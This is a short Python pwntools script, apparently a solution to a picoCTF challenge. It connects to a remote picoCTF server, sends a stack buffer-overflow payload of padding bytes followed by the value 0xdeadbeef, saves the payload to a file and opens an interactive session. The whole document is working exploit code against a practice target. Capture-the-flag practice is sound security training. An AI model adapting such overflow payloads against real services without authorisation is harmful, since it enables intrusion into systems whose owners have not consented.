from pwn import *

p = remote("mars.picoctf.net", 31890)

payload = b'A' * 256
payload += b'A' * 8
payload += p64(0xdeadbeef)

fd = open("payload", "wb")
fd.write(payload)
fd.close()

p.sendline(payload)
p.interactive()
